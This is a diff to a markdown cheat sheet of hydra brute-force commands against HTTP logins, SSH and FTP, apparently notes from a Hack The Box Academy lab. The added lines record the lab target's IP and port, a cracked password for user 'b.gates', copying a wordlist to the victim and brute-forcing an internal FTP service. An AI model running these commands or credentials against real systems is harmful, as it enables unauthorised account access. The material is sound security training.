@@ -18,8 +18,9 @@
 | `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
 | `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
 | `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
-| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
+| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists [Service Authentication Brute Forcing](https://academy.hackthebox.com/module/57/section/491) |
 | `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |
+| `hydra -l b.gates -P william.txt ssh://83.136.251.221:53718` | Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above. Then try to SSH into the server. You should find a flag in the home dir. [](https://academy.hackthebox.com/module/57/section/491) |
 
 # Wordlists
 
@@ -58,4 +59,6 @@ hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Pa
 | `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
 | `ftp 127.0.0.1` | FTP to Server |
 | `su - user` | Switch to User |
-
+| `netstat -antp | grep -i list` | Identify internal network services and their ports running on the local victim machine. |
+| `scp -P 53718 ./william.txt b.gates@83.136.251.221:/tmp` | Use SCP with the obtain credentials for user `b.gates` and password `4dn1l3M!$` to copy the files to target. |
+| `hydra -l m.gates -P /tmp/william.txt ftp://127.0.0.1` | Use `hydra` on the victim locally to identify password of user against internal FTP service. |
